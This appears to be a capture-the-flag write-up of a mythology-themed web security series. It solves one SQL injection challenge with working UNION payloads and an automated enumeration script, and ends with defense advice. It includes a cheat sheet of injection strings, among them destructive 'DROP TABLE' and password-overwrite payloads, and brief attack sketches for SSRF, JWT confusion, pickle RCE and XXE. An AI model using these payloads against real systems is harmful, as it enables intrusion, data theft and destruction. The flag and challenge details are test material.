# Pantheon Challenges

**Category:** Greek mythology-themed web security series  
**Total Points:** 75+ (1 solved, 8 remaining)  
**Challenges Solved:** 1/9

## Overview

The Pantheon series consists of classic web vulnerabilities, forensics, and cloud misconfigurations, each named after figures from Greek mythology. These are production-level challenges (not onboarding practice) covering real-world attack vectors.

## Challenges

| Challenge | Points | Type | Status |
|-----------|--------|------|--------|
| [Cassandra's Warning](#cassandras-warning) | 75 | SQL Injection | [SOLVED] Solved |
| Charon's Ferry | 100 | SSRF | [NOT SOLVED] Not attempted |
| Echo | 150 | Protocol Reverse Engineering | [NOT SOLVED] Not attempted |
| Hydra's Signature | 125 | JWT Auth Bypass | [NOT SOLVED] Not attempted |
| Midas' Touch | 150 | Cloud IAM Misconfiguration | [NOT SOLVED] Not attempted |
| Pandora's Box | 125 | Insecure Deserialization | [NOT SOLVED] Not attempted |
| Theseus's Trial I: Recon | 100 | Multi-Stage Chain | [NOT SOLVED] Not attempted |
| The Sirens' Call | 100 | Network Forensics | [NOT SOLVED] Not attempted |
| Trojan Horse | 100 | XXE Injection | [NOT SOLVED] Not attempted |

---

## Cassandra's Warning

**Challenge ID:** 13  
**Points:** 75  
**Type:** SQL Injection (Union-based)  
**Difficulty:** Easy-Medium

### Challenge Description

> A staff directory search endpoint trusts your input a little too much. Find the flag hiding in a table nobody meant to expose.

### Mythology Reference

**Cassandra** was a Trojan princess cursed to utter true prophecies that no one would believe. In this challenge, the "warning" is that the SQL injection vulnerability is obvious (trusts input "too much"), but finding the right table/column requires enumeration.

### API Endpoint

```
GET /search?name=<input>
Target: 10.244.2.197:9002
```

### Vulnerability

Classic **SQL Injection** via unsanitized user input in a search query:

```python
# Vulnerable server code (conceptual)
@app.route('/search')
def search():
    name = request.args.get('name', '')
    
    # NO INPUT SANITIZATION!
    query = f"SELECT id, name, role FROM staff WHERE name LIKE '%{name}%'"
    
    results = db.execute(query)
    return jsonify({"results": results})
```

**The problem:** User input is directly interpolated into the SQL query without escaping or parameterization.

### SQL Injection Basics

When input is unsanitized, an attacker can:

1. **Close the original query** with `'` 
2. **Add arbitrary SQL** with operators like `UNION`, `OR`, `;`
3. **Extract data from other tables**

**Example:**

```
Normal query:
  SELECT id, name, role FROM staff WHERE name LIKE '%Alice%'

Injected input: ' UNION SELECT * FROM secrets--
  SELECT id, name, role FROM staff WHERE name LIKE '%' 
  UNION SELECT * FROM secrets--%'
```

The `--` comments out the rest of the original query.

### Solution Strategy

Since the response format is fixed (3 fields: `id`, `name`, `role`), we need a **UNION-based injection** that returns matching columns:

```sql
' UNION SELECT id, column_name, 3 FROM table_name--
```

### Discovery Process

Our agent enumerated common table/column combinations:

```python
# Common flag storage patterns
table_candidates = ['flags', 'flag', 'secrets']
column_candidates = ['flag', 'value', 'secret', 'data', 'content']

# Try all combinations
for table in table_candidates:
    for column in column_candidates:
        payload = f"' UNION SELECT id, {column}, 3 FROM {table}--"
        response = requests.get(f"{target}/search?name={payload}")
        
        if 'HALCTF{' in response.text:
            return extract_flag(response.text)
```

### Successful Payload

```
Input: ' UNION SELECT id, value, 3 FROM secrets--

Full Query:
SELECT id, name, role FROM staff 
WHERE name LIKE '%' 
UNION SELECT id, value, 3 FROM secrets--%'
```

**Result:**

```json
{
  "results": [
    {"id": 1, "name": "Cassandra Vale", "role": "oracle"},
    {"id": 1, "name": "HALCTF{16135663703fd9d53a5b7b75de8d5721}", "role": 3},
    {"id": 2, "name": "Priam Osei", "role": "engineer"},
    ...
  ]
}
```

The flag appeared as the second row, with `name` field containing the flag!

### Why This Worked

1. **Table name:** `secrets` (not `flags` or `flag`)
2. **Column name:** `value` (not `flag` or `content`)
3. **Column count match:** Original query returns 3 columns (`id`, `name`, `role`), so our UNION must also return 3
4. **Type compatibility:** `id` (int), `value` (string), `3` (int literal) matched the original types

### Attack Breakdown

```
Original Query Structure:
┌──────────────────────────────────────────────────┐
│ SELECT id, name, role FROM staff                 │
│ WHERE name LIKE '%<USER_INPUT>%'                 │
└──────────────────────────────────────────────────┘

Injection Point:
┌──────────────────────────────────────────────────┐
│ SELECT id, name, role FROM staff                 │
│ WHERE name LIKE '%' UNION SELECT id, value, 3   │
│                     FROM secrets--%'             │
│                                    ↑             │
│                                    └─ Comment    │
└──────────────────────────────────────────────────┘

Result Set:
┌─────────┬──────────────────────────────────────┬─────────┐
│   id    │  name                                │  role   │
├─────────┼──────────────────────────────────────┼─────────┤
│   1     │  Cassandra Vale                      │  oracle │  ← Staff table
│   2     │  Priam Osei                          │  engineer│
│  ...    │  ...                                 │  ...    │
├─────────┼──────────────────────────────────────┼─────────┤
│   1     │  HALCTF{16135...}                    │  3      │  ← Secrets table!
└─────────┴──────────────────────────────────────┴─────────┘
```

### Agent Implementation

```python
import requests
import re

def solve_cassandra(target_ip, target_port):
    """
    SQL Injection to extract flag from secrets table
    """
    base_url = f"http://{target_ip}:{target_port}"
    
    # Table and column candidates
    tables = ['flags', 'flag', 'secrets']
    columns = ['flag', 'value', 'secret', 'data', 'content']
    
    # Try all combinations
    for table in tables:
        for column in columns:
            # UNION-based injection
            payload = f"' UNION SELECT id, {column}, 3 FROM {table}--"
            
            try:
                response = requests.get(
                    f"{base_url}/search",
                    params={"name": payload},
                    timeout=5
                )
                
                # Check response
                if response.status_code == 200:
                    # Look for flag pattern
                    flag_match = re.search(r'HALCTF\{[^}]+\}', response.text)
                    if flag_match:
                        return flag_match.group(0)
                        
            except requests.RequestException:
                continue
    
    return None
```

### Defense Strategies

How to prevent this vulnerability:

#### 1. Parameterized Queries (Best Practice)

```python
# SAFE - Uses parameterized query
@app.route('/search')
def search():
    name = request.args.get('name', '')
    
    # Parameters prevent injection
    query = "SELECT id, name, role FROM staff WHERE name LIKE ?"
    results = db.execute(query, (f'%{name}%',))
    
    return jsonify({"results": results})
```

#### 2. ORM (Abstraction Layer)

```python
# SAFE - ORM handles escaping
@app.route('/search')
def search():
    name = request.args.get('name', '')
    
    # SQLAlchemy automatically escapes
    results = Staff.query.filter(
        Staff.name.like(f'%{name}%')
    ).all()
    
    return jsonify({"results": [r.to_dict() for r in results]})
```

#### 3. Input Validation + Escaping (Defense in Depth)

```python
import re

@app.route('/search')
def search():
    name = request.args.get('name', '')
    
    # Whitelist validation
    if not re.match(r'^[a-zA-Z0-9\s-]+$', name):
        return jsonify({"error": "Invalid input"}), 400
    
    # Escape special characters (still use parameterized!)
    name = name.replace("'", "''")
    
    # Parameterized query
    query = "SELECT id, name, role FROM staff WHERE name LIKE ?"
    results = db.execute(query, (f'%{name}%',))
    
    return jsonify({"results": results})
```

#### 4. Least Privilege (Database Permissions)

```sql
-- Create read-only user for web app
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';

-- Only grant SELECT on staff table
GRANT SELECT ON database.staff TO 'webapp'@'localhost';

-- DO NOT grant access to secrets table!
REVOKE ALL ON database.secrets FROM 'webapp'@'localhost';
```

**With least privilege:** Even if SQL injection succeeds, attacker can't access `secrets` table.

### Common SQL Injection Patterns

```sql
-- Comment-based
' OR 1=1--
' OR '1'='1

-- UNION-based (extract data)
' UNION SELECT null, null, null--
' UNION SELECT username, password, null FROM users--

-- Stacked queries (multiple statements)
'; DROP TABLE users--
'; UPDATE admin SET password='hacked' WHERE id=1--

-- Boolean blind (true/false inference)
' AND 1=1--  (returns results)
' AND 1=2--  (returns nothing)

-- Time-based blind (timing inference)
' AND SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0)--

-- Error-based (extract via error messages)
' AND 1=CONVERT(int, (SELECT @@version))--
```

### Testing for SQL Injection

**Quick tests:**

```bash
# 1. Single quote test (breaks query)
curl "http://target/search?name='"
# Error? Likely vulnerable

# 2. Boolean test (logic manipulation)
curl "http://target/search?name=test' OR '1'='1"
# Returns all results? Vulnerable

# 3. Comment test (closes query early)
curl "http://target/search?name=test'--"
# Works? Vulnerable

# 4. UNION test (column count detection)
curl "http://target/search?name=test' UNION SELECT null--"
curl "http://target/search?name=test' UNION SELECT null, null--"
curl "http://target/search?name=test' UNION SELECT null, null, null--"
# No error on N nulls? Query has N columns
```

### Lessons Learned

1. **Enumerate methodically** - Try common table/column names systematically
2. **Match column count** - UNION requires same number of columns as original query
3. **Match types** - Use appropriate data types (ints, strings, nulls)
4. **Use comments wisely** - `--` (SQL) or `#` (MySQL) to close original query
5. **Check error messages** - 500 errors reveal query structure
6. **Automate enumeration** - Manual testing of all combinations is tedious

### OWASP Top 10 Reference

**SQL Injection** is consistently #1 or #3 in OWASP Top 10:
- **2021:** A03:2021 – Injection
- **2017:** A1:2017 – Injection

**Impact:**
- [WARNING] Data breach (read sensitive data)
- [WARNING] Data manipulation (modify/delete records)
- [WARNING] Authentication bypass (login as admin)
- [WARNING] Remote code execution (via `xp_cmdshell` in MSSQL)

### Timeline

- **Step 1-10:** Tried `flags.flag`, `flags.value`, etc. (all 500 errors)
- **Step 11-20:** Tried `flag.flag`, `flag.value`, etc. (all 500 errors)
- **Step 21:** Tried `secrets.flag` (500 error)
- **Step 22:** Tried `secrets.value` (200 OK - flag found!)
- **Step 23:** Extracted flag from response
- **Step 24:** Submitted flag (75 points awarded)

**Total time:** ~30 seconds from start to flag

### Flag

```
HALCTF{16135663703fd9d53a5b7b75de8d5721}
```

### Related Challenges

After mastering SQL injection:
- **Charon's Ferry** - SSRF (100 pts)
- **Pandora's Box** - Insecure deserialization (125 pts)
- **Trojan Horse** - XXE injection (100 pts)

---

## Remaining Challenges (Not Attempted)

### Charon's Ferry (100 pts) - SSRF

**Type:** Server-Side Request Forgery

**Description:** Two services (ferry and underworld), but only ferry responds directly. Use ferry's `/fetch` endpoint to make server-side requests to underworld. Bypass IP filtering by encoding IPv4 addresses differently.

**Attack Vector:** SSRF bypass via IPv4 encoding (decimal, octal, hex)

---

### Echo (150 pts) - Protocol RE

**Type:** Binary Protocol Reverse Engineering

**Description:** TCP service with custom binary framing. Partial client provided. Reverse engineer checksum algorithm from captured replies.

**Attack Vector:** Analyze PONG/ECHO replies to derive checksum, implement GET_FLAG

---

### Hydra's Signature (125 pts) - JWT

**Type:** JWT Algorithm Confusion

**Description:** Auth service publishes RSA public key. JWT verification doesn't validate algorithm header. Switch from RS256 to HS256 and use public key as HMAC secret.

**Attack Vector:** JWT alg confusion (RS256 → HS256)

---

### Midas' Touch (150 pts) - Cloud IAM

**Type:** IAM Role Assumption Chain

**Description:** Start as intern, assume roles to reach admin. Not every role trusts every role - requires multi-hop chain.

**Attack Vector:** IAM privilege escalation via role chaining

---

### Pandora's Box (125 pts) - Deserialization

**Type:** Python Pickle Injection

**Description:** Preferences store accepts base64-encoded pickle data. Exploit pickle's `__reduce__` to achieve RCE.

**Attack Vector:** Insecure deserialization (Python pickle)

---

### Theseus's Trial I: Recon (100 pts) - Multi-Stage

**Type:** Credential Leakage

**Description:** Staff directory contains leaked credential in notes field. Extract and verify for next stage.

**Attack Vector:** Information disclosure → multi-stage compound

---

### The Sirens' Call (100 pts) - PCAP Forensics

**Type:** Network Traffic Analysis

**Description:** PCAP file contains cleartext credentials. Extract and use for HTTP Basic Auth against `/vault`.

**Attack Vector:** Network forensics (Wireshark/scapy)

---

### Trojan Horse (100 pts) - XXE

**Type:** XML External Entity Injection

**Description:** XML feed importer parses user input. Inject external entity to read server files.

**Attack Vector:** XXE to read local files

---

## Agent Architecture

```
pantheon-agent/
├── agent.py              # Main entry, routing
├── solvers/
│   ├── cassandra.py      # SQL injection (SOLVED)
│   ├── charon.py         # SSRF bypass (stub)
│   ├── echo.py           # Binary protocol (stub)
│   ├── hydra.py          # JWT confusion (stub)
│   ├── midas.py          # IAM escalation (stub)
│   ├── pandora.py        # Pickle RCE (stub)
│   ├── theseus.py        # Credential leak (stub)
│   ├── sirens.py         # PCAP forensics (stub)
│   └── trojan.py         # XXE injection (stub)
└── utils/
    ├── mcp_client.py     # MCP communication
    └── submit.py         # Flag submission
```

### Cassandra Solver Implementation

```python
async def solve_cassandra(mcp_client, target_ip, target_port):
    """
    Enumerate table/column combinations for SQL injection
    """
    base_url = f"http://{target_ip}:{target_port}"
    
    tables = ['flags', 'flag', 'secrets']
    columns = ['flag', 'value', 'secret', 'data', 'content']
    
    for table in tables:
        for column in columns:
            payload = f"' UNION SELECT id, {column}, 3 FROM {table}--"
            
            response = await mcp_client.call_tool("http_get", {
                "url": f"{base_url}/search",
                "params": {"name": payload}
            })
            
            if response.get("status") == 200:
                flag_match = re.search(r'HALCTF\{[^}]+\}', 
                                      response.get("body", ""))
                if flag_match:
                    return flag_match.group(0)
    
    return None
```

---

## Statistics

- **Challenges:** 9 total, 1 solved, 8 remaining
- **Points:** 75 earned, 1,000+ available
- **Time to Solve:** ~30 seconds (Cassandra)
- **Agent Version:** pantheon-agent-v2.tar

## Key Takeaways

1. **SQL injection remains common** - Despite being known for decades, still prevalent
2. **Enumeration is key** - Try common patterns systematically
3. **UNION requires column match** - Must return same number/types as original query
4. **Comments close queries** - `--` is critical for SQL injection
5. **Always use parameterized queries** - Never concatenate user input into SQL

---

**Difficulty Rating:** ⭐⭐☆☆☆ (2/5 - Easy, with enumeration)  
**Time to Solve:** < 1 minute (with automation)  
**Skills Practiced:** SQL injection, UNION queries, enumeration  
**Recommended Next:** Charon's Ferry (SSRF), Trojan Horse (XXE)
